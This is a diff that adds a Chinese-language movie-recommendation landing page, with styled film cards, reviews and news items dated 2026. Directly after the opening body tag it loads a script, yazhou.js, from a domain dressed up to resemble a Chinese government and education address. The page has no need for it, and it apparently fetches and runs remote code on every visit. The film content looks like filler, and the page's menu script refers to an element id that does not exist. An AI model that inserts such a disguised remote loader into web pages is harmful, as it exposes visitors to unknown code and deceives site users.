@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>原老七电影网 | 精选好片一网打尽 - yuanlaoqidianyingwang-app</title>
+<meta name="description" content="原老七电影网（yuanlaoqidianyingwang-app）专注为广大影迷精选优质电影资源，涵盖院线热映、经典老片、高分冷门佳作。每日更新片单推荐，深度影评解析，带你发现每一部值得一看的好电影。访问官网：https://yuanlaoqidianyingwang-app.github.io">
+<meta name="keywords" content="原老七电影网, yuanlaoqidianyingwang-app, 好电影推荐, 院线热映影片, 经典老片重温, 高分冷门佳作, 深度影评解析, 电影资讯平台, 每日片单更新, 独立电影推荐">
+<meta name="author" content="原老七电影网">
+<meta name="copyright" content="Copyright © 2026 原老七电影网. All Rights Reserved.">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="googlebot" content="index, follow">
+<meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<link rel="canonical" href="https://yuanlaoqidianyingwang-app.github.io">
+<meta property="og:type" content="website">
+<meta property="og:title" content="原老七电影网 - 精选好片一网打尽">
+<meta property="og:description" content="原老七电影网专注精选优质电影资源，每日更新片单推荐，深度影评解析，带你发现每一部值得一看的好电影。">
+<meta property="og:url" content="https://yuanlaoqidianyingwang-app.github.io">
+<meta property="og:site_name" content="原老七电影网">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="原老七电影网 - 精选好片一网打尽">
+<meta name="twitter:description" content="原老七电影网专注精选优质电影资源，每日更新片单推荐，带你发现每一部值得一看的好电影。">
+<meta name="theme-color" content="#0a0a23">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="format-detection" content="telephone=no">
+<style>
+:root{
+  --bg-primary:#08081a;
+  --bg-secondary:#0f0f2e;
+  --bg-card:rgba(255,255,255,.04);
+  --bg-card-hover:rgba(255,255,255,.08);
+  --accent:#e94560;
+  --accent-light:#ff6b81;
+  --accent2:#0f3460;
+  --text-primary:#f0f0f5;
+  --text-secondary:#a0a0c0;
+  --text-muted:#6b6b8a;
+  --border-color:rgba(233,69,96,.2);
+  --shadow-glow:0 0 30px rgba(233,69,96,.15);
+  --radius:16px;
+  --max-width:1200px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  background:var(--bg-primary);
+  color:var(--text-primary);
+  line-height:1.7;
+  overflow-x:hidden;
+  min-height:100vh;
+}
+body::before{
+  content:'';
+  position:fixed;
+  top:0;left:0;right:0;bottom:0;
+  background:
+    radial-gradient(ellipse 600px 400px at 15% 10%, rgba(233,69,96,.06), transparent),
+    radial-gradient(ellipse 500px 500px at 85% 40%, rgba(15,52,96,.12), transparent),
+    radial-gradient(ellipse 700px 300px at 50% 90%, rgba(233,69,96,.04), transparent);
+  pointer-events:none;
+  z-index:0;
+}
+a{text-decoration:none;color:inherit}
+ul,ol{list-style:none}
+img{max-width:100%;height:auto;display:block}
+
+/* ===== Layout ===== */
+.container{max-width:var(--max-width);margin:0 auto;padding:0 20px;position:relative;z-index:1}
+section{padding:80px 0;position:relative}
+
+/* ===== Header ===== */
+.header{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:rgba(8,8,26,.85);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(255,255,255,.06);
+  transition:all .3s ease;
+}
+.header.scrolled{box-shadow:0 4px 30px rgba(0,0,0,.5)}
+.nav{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 20px;max-width:var(--max-width);margin:0 auto;
+}
+.logo{
+  font-size:22px;font-weight:800;letter-spacing:-.5px;
+  background:linear-gradient(135deg,var(--accent),var(--accent-light));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;white-space:nowrap;
+}
+.nav-links{display:flex;gap:8px;align-items:center}
+.nav-links a{
+  font-size:14px;font-weight:500;color:var(--text-secondary);
+  padding:8px 14px;border-radius:20px;transition:all .25s ease;
+  white-space:nowrap;
+}
+.nav-links a:hover{color:var(--text-primary);background:var(--bg-card)}
+.menu-toggle{display:none;flex-direction:column;gap:5px;cursor:pointer;padding:4px}
+.menu-toggle span{width:22px;height:2px;background:var(--text-primary);border-radius:2px;transition:all .3s}
+
+/* ===== Hero ===== */
+.hero{
+  min-height:100vh;display:flex;align-items:center;justify-content:center;
+  text-align:center;padding:120px 20px 80px;position:relative;
+}
+.hero-badge{
+  display:inline-flex;align-items:center;gap:6px;
+  background:var(--bg-card);border:1px solid var(--border-color);
+  border-radius:30px;padding:6px 16px 6px 10px;
+  font-size:13px;color:var(--text-secondary);margin-bottom:28px;
+}
+.hero-badge .dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
+.hero h1{
+  font-size:clamp(32px,6vw,64px);font-weight:900;line-height:1.15;
+  margin-bottom:20px;letter-spacing:-1px;
+}
+.hero h1 .highlight{color:var(--accent)}
+.hero-sub{
+  font-size:clamp(15px,2.5vw,19px);color:var(--text-secondary);
+  max-width:600px;margin:0 auto 36px;line-height:1.8;
+}
+.hero-cta{
+  display:inline-flex;align-items:center;gap:8px;
+  background:linear-gradient(135deg,var(--accent),var(--accent2));
+  color:#fff;font-size:16px;font-weight:600;
+  padding:14px 36px;border-radius:30px;
+  transition:all .3s ease;box-shadow:var(--shadow-glow);
+}
+.hero-cta:hover{transform:translateY(-2px);box-shadow:0 8px 40px rgba(233,69,96,.3)}
+.hero-stats{
+  display:flex;gap:40px;justify-content:center;margin-top:60px;flex-wrap:wrap;
+}
+.hero-stat .num{
+  font-size:clamp(24px,4vw,36px);font-weight:800;color:var(--text-primary);
+  display:block;line-height:1;
+}
+.hero-stat .label{font-size:13px;color:var(--text-muted);margin-top:6px;display:block}
+
+/* ===== Section Header ===== */
+.sec-header{text-align:center;margin-bottom:56px}
+.sec-tag{
+  display:inline-block;font-size:12px;font-weight:700;letter-spacing:2px;
+  text-transform:uppercase;color:var(--accent);
+  background:rgba(233,69,96,.1);padding:6px 16px;border-radius:20px;margin-bottom:16px;
+}
+.sec-title{font-size:clamp(24px,4vw,38px);font-weight:800;line-height:1.3;margin-bottom:12px}
+.sec-desc{font-size:16px;color:var(--text-secondary);max-width:560px;margin:0 auto}
+
+/* ===== About ===== */
+.about-grid{display:grid;grid-template-columns:1fr 1fr;gap:48px;align-items:center}
+.about-text h3{font-size:22px;font-weight:700;margin-bottom:16px;color:var(--text-primary)}
+.about-text p{color:var(--text-secondary);margin-bottom:16px;font-size:15px;line-height:1.9}
+.about-features{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}
+.about-feat{
+  background:var(--bg-card);border:1px solid rgba(255,255,255,.06);
+  border-radius:12px;padding:16px;text-align:center;
+}
+.about-feat .icon{font-size:24px;margin-bottom:8px}
+.about-feat .txt{font-size:13px;color:var(--text-secondary);font-weight:600}
+
+/* ===== Movie Cards ===== */
+.movie-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:24px}
+.movie-card{
+  background:var(--bg-card);border:1px solid rgba(255,255,255,.06);
+  border-radius:var(--radius);overflow:hidden;transition:all .35s ease;
+  cursor:pointer;
+}
+.movie-card:hover{
+  transform:translateY(-6px);background:var(--bg-card-hover);
+  box-shadow:var(--shadow-glow);border-color:var(--border-color);
+}
+.movie-poster{
+  width:100%;aspect-ratio:3/4;display:flex;align-items:center;justify-content:center;
+  font-size:48px;position:relative;overflow:hidden;
+}
+.movie-poster::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(180deg,transparent 40%,rgba(0,0,0,.6));
+}
+.movie-poster .rating{
+  position:absolute;top:12px;right:12px;z-index:2;
+  background:rgba(233,69,96,.9);color:#fff;
+  font-size:12px;font-weight:700;padding:4px 10px;border-radius:12px;
+}
+.movie-info{padding:18px}
+.movie-info h4{font-size:17px;font-weight:700;margin-bottom:6px}
+.movie-info .meta{font-size:13px;color:var(--text-muted);display:flex;gap:10px;flex-wrap:wrap}
+.movie-info .genre{
+  display:inline-block;font-size:11px;color:var(--accent-light);
+  background:rgba(233,69,96,.1);padding:3px 10px;border-radius:10px;margin-top:10px;
+}
+
+/* ===== Reviews ===== */
+.review-list{display:flex;flex-direction:column;gap:20px;max-width:900px;margin:0 auto}
+.review-item{
+  background:var(--bg-card);border:1px solid rgba(255,255,255,.06);
+  border-radius:var(--radius);padding:28px;transition:all .3s ease;
+}
+.review-item:hover{border-color:var(--border-color);background:var(--bg-card-hover)}
+.review-head{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.review-avatar{
+  width:44px;height:44px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:20px;flex-shrink:0;
+}
+.review-name{font-weight:700;font-size:15px}
+.review-date{font-size:12px;color:var(--text-muted)}
+.review-body{font-size:15px;color:var(--text-secondary);line-height:1.9}
+.review-score{color:var(--accent);font-size:13px;font-weight:700;margin-top:12px}
+
+/* ===== News ===== */
+.news-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:20px}
+.news-item{
+  background:var(--bg-card);border:1px solid rgba(255,255,255,.06);
+  border-radius:var(--radius);padding:24px;transition:all .3s ease;
+}
+.news-item:hover{border-color:var(--border-color);transform:translateY(-3px)}
+.news-date{font-size:12px;color:var(--accent);font-weight:700;margin-bottom:8px}
+.news-item h4{font-size:17px;font-weight:700;margin-bottom:10px;line-height:1.5}
+.news-item p{font-size:14px;color:var(--text-secondary);line-height:1.8}
+
+/* ===== Contact ===== */
+.contact-wrap{max-width:700px;margin:0 auto;text-align:center}
+.contact-links{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-top:32px}
+.contact-link{
+  display:inline-flex;align-items:center;gap:8px;
+  background:var(--bg-card);border:1px solid rgba(255,255,255,.08);
+  border-radius:12px;padding:14px 24px;font-size:14px;font-weight:600;
+  color:var(--text-secondary);transition:all .3s ease;
+}
+.contact-link:hover{border-color:var(--accent);color:var(--text-primary);background:rgba(233,69,96,.08)}
+.contact-domain{
+  font-size:clamp(16px,3vw,22px);font-weight:700;color:var(--accent-light);
+  margin-top:28px;padding:16px 28px;border-radius:12px;
+  background:rgba(233,69,96,.05);border:1px dashed var(--border-color);
+  display:inline-block;word-break:break-all;
+}
+
+/* ===== Footer ===== */
+.footer{
+  border-top:1px solid rgba(255,255,255,.06);
+  padding:40px 20px;text-align:center;position:relative;z-index:1;
+}
+.footer-logo{font-size:20px;font-weight:800;margin-bottom:12px;
+  background:linear-gradient(135deg,var(--accent),var(--accent-light));
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;}
+.footer-links{display:flex;gap:20px;justify-content:center;flex-wrap:wrap;margin:16px 0}
+.footer-links a{font-size:13px;color:var(--text-muted);transition:color .25s}
+.footer-links a:hover{color:var(--accent-light)}
+.footer-copy{font-size:12px;color:var(--text-muted);margin-top:12px}
+.footer-domain{font-size:12px;color:var(--text-muted);margin-top:4px}
+
+/* ===== Responsive ===== */
+@media (max-width:900px){
+  .about-grid{grid-template-columns:1fr;gap:32px}
+  section{padding:60px 0}
+}
+@media (max-width:768px){
+  .menu-toggle{display:flex}
+  .nav-links{
+    position:fixed;top:0;right:-100%;flex-direction:column;
+    background:var(--bg-secondary);width:260px;height:100vh;
+    padding:80px 24px 40px;transition:right .35s ease;
+    box-shadow:-10px 0 40px rgba(0,0,0,.5);align-items:flex-start;gap:4px;
+  }
+  .nav-links.active{right:0}
+  .nav-links a{width:100%;padding:14px 16px;font-size:16px;border-radius:12px}
+  .menu-toggle.active span:nth-child(1){transform:rotate(45deg) translate(5px,5px)}
+  .menu-toggle.active span:nth-child(2){opacity:0}
+  .menu-toggle.active span:nth-child(3){transform:rotate(-45deg) translate(5px,-5px)}
+  .hero-stats{gap:24px}
+  .review-item{padding:20px}
+  .about-features{grid-template-columns:1fr 1fr}
+}
+@media (max-width:480px){
+  .container{padding:0 16px}
+  .hero{padding:100px 16px 60px}
+  .about-features{grid-template-columns:1fr}
+  .movie-grid{grid-template-columns:1fr 1fr;gap:12px}
+  .movie-info{padding:12px}
+  .movie-info h4{font-size:14px}
+  .sec-header{margin-bottom:36px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- Header -->
+<header class="header" id="header">
+  <nav class="nav">
+    <a href="#" class="logo">原老七电影网</a>
+    <div class="nav-links" id="navLinks">
+      <a href="#home">首页</a>
+      <a href="#about">关于我们</a>
+      <a href="#movies">精选片单</a>
+      <a href="#reviews">影评专区</a>
+      <a href="#news">影视资讯</a>
+      <a href="#contact">联系我们</a>
+    </div>
+    <div class="menu-toggle" id="menuToggle">
+      <span></span><span></span><span></span>
+    </div>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+  <div class="container">
+    <div class="hero-badge"><span class="dot"></span> 每日精选 · 实时更新</div>
+    <h1>发现好电影<br><span class="highlight">从原老七电影网开始</span></h1>
+    <p class="hero-sub">原老七电影网（yuanlaoqidianyingwang-app）致力于为每一位影迷精选优质影片，从院线热映到经典老片，从高分佳作到冷门宝藏，让每一分钟观影时光都值得回味。</p>
+    <a href="#movies" class="hero-cta">探索精选片单 →</a>
+    <div class="hero-stats">
+      <div class="hero-stat"><span class="num">2000+</span><span class="label">精选影片</span></div>
+      <div class="hero-stat"><span class="num">50+</span><span class="label">影评专栏</span></div>
+      <div class="hero-stat"><span class="num">每日</span><span class="label">片单更新</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- About -->
+<section id="about">
+  <div class="container">
+    <div class="sec-header">
+      <span class="sec-tag">About Us</span>
+      <h2 class="sec-title">关于原老七电影网</h2>
+      <p class="sec-desc">我们不只是推荐电影，更是你的私人观影顾问</p>
+    </div>
+    <div class="about-grid">
+      <div class="about-text">
+        <h3>用心筛选每一部好电影</h3>
+        <p>原老七电影网（yuanlaoqidianyingwang-app）成立于影迷对优质内容的需求之上。我们相信，好电影不应该被埋没，每一位观众都值得遇见打动自己的那部作品。</p>
+        <p>从好莱坞大片到独立佳作，从经典黑白电影到最新院线热映，我们用专业的眼光和真诚的态度，为你呈现最值得一看的片单推荐。</p>
+        <div class="about-features">
+          <div class="about-feat"><div class="icon">🎬</div><div class="txt">多元片源</div></div>
+          <div class="about-feat"><div class="icon">⭐</div><div class="txt">专业评分</div></div>
+          <div class="about-feat"><div class="icon">📝</div><div class="txt">深度解析</div></div>
+          <div class="about-feat"><div class="icon">🔔</div><div class="txt">每日更新</div></div>
+        </div>
+      </div>
+      <div class="about-visual">
+        <div style="background:linear-gradient(135deg,rgba(233,69,96,.15),rgba(15,52,96,.2));border:1px solid var(--border-color);border-radius:var(--radius);padding:40px;text-align:center;">
+          <div style="font-size:64px;margin-bottom:16px;">🎞️</div>
+          <h4 style="font-size:20px;font-weight:700;margin-bottom:8px;">原老七电影网</h4>
+          <p style="color:var(--text-secondary);font-size:14px;">让好电影找到对的观众</p>
+          <div style="margin-top:24px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;">
+            <span style="font-size:12px;padding:6px 14px;border-radius:20px;background:rgba(233,69,96,.1);color:var(--accent-light);">院线热映</span>
+            <span style="font-size:12px;padding:6px 14px;border-radius:20px;background:rgba(233,69,96,.1);color:var(--accent-light);">经典老片</span>
+            <span style="font-size:12px;padding:6px 14px;border-radius:20px;background:rgba(233,69,96,.1);color:var(--accent-light);">高分佳作</span>
+            <span style="font-size:12px;padding:6px 14px;border-radius:20px;background:rgba(233,69,96,.1);color:var(--accent-light);">冷门宝藏</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Movies -->
+<section id="movies" style="background:rgba(255,255,255,.02);">
+  <div class="container">
+    <div class="sec-header">
+      <span class="sec-tag">Featured Films</span>
+      <h2 class="sec-title">精选片单推荐</h2>
+      <p class="sec-desc">每周精选优质影片，涵盖多种类型与风格</p>
+    </div>
+    <div class="movie-grid">
+      <div class="movie-card">
+        <div class="movie-poster" style="background:linear-gradient(135deg,#1a1a3e,#2d2d6e);">
+          <span class="rating">⭐ 9.2</span>
+          <span style="font-size:56px;z-index:1;">🎭</span>
+        </div>
+        <div class="movie-info">
+          <h4>星际回响</h4>
+          <div class="meta"><span>2026</span><span>科幻 / 冒险</span><span>148分钟</span></div>
+          <span class="genre">硬科幻</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster" style="background:linear-gradient(135deg,#2e1a3e,#4a2d6e);">
+          <span class="rating">⭐ 8.8</span>
+          <span style="font-size:56px;z-index:1;">🌃</span>
+        </div>
+        <div class="movie-info">
+          <h4>城市夜行者</h4>
+          <div class="meta"><span>2026</span><span>悬疑 / 犯罪</span><span>125分钟</span></div>
+          <span class="genre">悬疑烧脑</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster" style="background:linear-gradient(135deg,#3e1a1a,#6e2d2d);">
+          <span class="rating">⭐ 9.0</span>
+          <span style="font-size:56px;z-index:1;">🔥</span>
+        </div>
+        <div class="movie-info">
+          <h4>烈焰归来</h4>
+          <div class="meta"><span>2026</span><span>动作 / 剧情</span><span>136分钟</span></div>
+          <span class="genre">动作大片</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster" style="background:linear-gradient(135deg,#1a3e2e,#2d6e4a);">
+          <span class="rating">⭐ 8.5</span>
+          <span style="font-size:56px;z-index:1;">🌿</span>
+        </div>
+        <div class="movie-info">
+          <h4>绿野迷踪</h4>
+          <div class="meta"><span>2026</span><span>奇幻 / 冒险</span><span>112分钟</span></div>
+          <span class="genre">奇幻冒险</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster" style="background:linear-gradient(135deg,#1a2e3e,#2d4a6e);">
+          <span class="rating">⭐ 9.4</span>
+          <span style="font-size:56px;z-index:1;">🌊</span>
+        </div>
+        <div class="movie-info">
+          <h4>深海密语</h4>
+          <div class="meta"><span>2026</span><span>纪录片 / 自然</span><span>98分钟</span></div>
+          <span class="genre">纪录佳作</span>
+        </div>
+      </div>
+      <div class="movie-card">
+        <div class="movie-poster" style="background:linear-gradient(135deg,#3e3a1a,#6e6a2d);">
+          <span class="rating">⭐ 8.7</span>
+          <span style="font-size:56px;z-index:1;">🎪</span>
+        </div>
+        <div class="movie-info">
+          <h4>时光马戏团</h4>
+          <div class="meta"><span>2026</span><span>喜剧 / 温情</span><span>103分钟</span></div>
+          <span class="genre">治愈系</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Reviews -->
+<section id="reviews">
+  <div class="container">
+    <div class="sec-header">
+      <span class="sec-tag">Film Reviews</span>
+      <h2 class="sec-title">深度影评专区</h2>
+      <p class="sec-desc">专业视角解读每一帧画面背后的故事</p>
+    </div>
+    <div class="review-list">
+      <div class="review-item">
+        <div class="review-head">
+          <div class="review-avatar" style="background:linear-gradient(135deg,#e94560,#0f3460);">🎬</div>
+          <div><div class="review-name">老七说电影</div><div class="review-date">2026-10-08</div></div>
+        </div>
+        <div class="review-body">
+          《星际回响》不仅仅是一部科幻片，更是一封写给宇宙的情书。导演用极致的光影语言构建了令人窒息的视觉奇观，而剧本中关于人性、孤独与连接的探讨，则让这部作品拥有了超越类型的深度。每一帧画面都值得在大银幕上细细品味。
+        </div>
+        <div class="review-score">综合评分：★★★★★ 9.2/10</div>
+      </div>
+      <div class="review-item">
+        <div class="review-head">
+          <div class="review-avatar" style="background:linear-gradient(135deg,#0f3460,#e94560);">📽️</div>
+          <div><div class="review-name">光影观察员</div><div class="review-date">2026-10-05</div></div>
+        </div>
+        <div class="review-body">
+          《城市夜行者》用极简的叙事结构包裹了一个复杂的道德困境。影片的节奏把控堪称教科书级别，每一个反转都让人措手不及却又在情理之中。这不是一部可以快进观看的电影，它需要你全神贯注地沉浸其中。
+        </div>
+        <div class="review-score">综合评分：★★★★☆ 8.8/10</div>
+      </div>
+      <div class="review-item">
+        <div class="review-head">
+          <div class="review-avatar" style="background:linear-gradient(135deg,#6e2d2d,#e94560);">🍿</div>
+          <div><div class="review-name">周末观影指南</div><div class="review-date">2026-10-01</div></div>
+        </div>
+        <div class="review-body">
+          《烈焰归来》重新定义了动作片的可能性。没有无脑的爆炸堆砌，每一场动作戏都服务于角色弧光和情感推进。当最后一幕的真相揭晓时，你会意识到这不仅仅是一部爽片，更是一个关于救赎与和解的动人故事。
+        </div>
+        <div class="review-score">综合评分：★★★★★ 9.0/10</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- News -->
+<section id="news" style="background:rgba(255,255,255,.02);">
+  <div class="container">
+    <div class="sec-header">
+      <span class="sec-tag">News & Updates</span>
+      <h2 class="sec-title">影视资讯速递</h2>
+      <p class="sec-desc">第一时间掌握电影圈最新动态</p>
+    </div>
+    <div class="news-list">
+      <div class="news-item">
+        <div class="news-date">2026.10.10</div>
+        <h4>2026年第四季度院线排片前瞻：多部大片扎堆上映</h4>
+        <p>随着国庆档的落幕，第四季度院线迎来新一轮片源高峰。多部备受期待的作品将陆续登陆大银幕，为观众带来丰富的观影选择。</p>
+      </div>
+      <div class="news-item">
+        <div class="news-date">2026.10.07</div>
+        <h4>国际电影节获奖名单公布：亚洲电影大放异彩</h4>
+        <p>今年的国际电影节上，多部亚洲作品斩获重要奖项，展现了中国电影在国际舞台上的日益提升的影响力与艺术水准。</p>
+      </div>
+      <div class="news-item">
+        <div class="news-date">2026.10.03</div>
+        <h4>经典老片4K修复计划启动：重温银幕记忆</h4>
+        <p>多家电影机构联合启动经典影片4K修复工程，多部影史经典将以全新画质重回观众视野，让新一代观众也能感受经典魅力。</p>
+      </div>
+      <div class="news-item">
+        <div class="news-date">2026.09.28</div>
+        <h4>原创内容崛起：独立电影迎来黄金时代</h4>
+        <p>随着流媒体平台的兴起和制作门槛的降低，越来越多的独立电影人获得了展示才华的机会，原创内容生态日趋繁荣。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Contact -->
+<section id="contact">
+  <div class="container">
+    <div class="sec-header">
+      <span class="sec-tag">Get In Touch</span>
+      <h2 class="sec-title">联系我们</h2>
+      <p class="sec-desc">有任何影片推荐或合作意向，欢迎随时联系</p>
+    </div>
+    <div class="contact-wrap">
+      <p style="color:var(--text-secondary);font-size:16px;max-width:520px;margin:0 auto;">
+        原老七电影网期待与每一位热爱电影的你交流分享。无论是影片推荐、观影心得，还是内容合作，我们都欢迎你的来信。
+      </p>
+      <div class="contact-links">
+        <a href="#" class="contact-link">📧 邮件联系</a>
+        <a href="#" class="contact-link">💬 在线留言</a>
+        <a href="#" class="contact-link">📱 关注我们</a>
+        <a href="#" class="contact-link">🤝 商务合作</a>
+      </div>
+      <div class="contact-domain">
+        官方网站：https://yuanlaoqidianyingwang-app.github.io
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- Footer -->
+<footer class="footer">
+  <div class="footer-logo">原老七电影网</div>
+  <p style="color:var(--text-muted);font-size:14px;">精选好片 · 深度影评 · 每日更新</p>
+  <div class="footer-links">
+    <a href="#home">首页</a>
+    <a href="#about">关于我们</a>
+    <a href="#movies">精选片单</a>
+    <a href="#reviews">影评专区</a>
+    <a href="#news">影视资讯</a>
+    <a href="#contact">联系我们</a>
+  </div>
+  <div class="footer-copy">Copyright © 2026 原老七电影网（yuanlaoqidianyingwang-app）. All Rights Reserved.</div>
+  <div class="footer-domain">https://yuanlaoqidianyingwang-app.github.io</div>
+</footer>
+
+<script>
+// Header scroll effect
+window.addEventListener('scroll',function(){
+  var header=document.getElementById('header');
+  if(window.scrollY>50){header.classList.add('scrolled');}
+  else{header.classList.remove('scrolled');}
+});
+// Mobile menu toggle
+var menuToggle=document.getElementById('menu-toggle');
+var navLinks=document.getElementById('navLinks');
+menuToggle.addEventListener('click',function(){
+  navLinks.classList.toggle('active');
+  menuToggle.classList.toggle('active');
+});
+// Close mobile menu on link click
+var navAnchors=navLinks.querySelectorAll('a');
+navAnchors.forEach(function(anchor){
+  anchor.addEventListener('click',function(){
+    navLinks.classList.remove('active');
+    menuToggle.classList.remove('active');
+  });
+});
+</script>
+</body>
+</html>
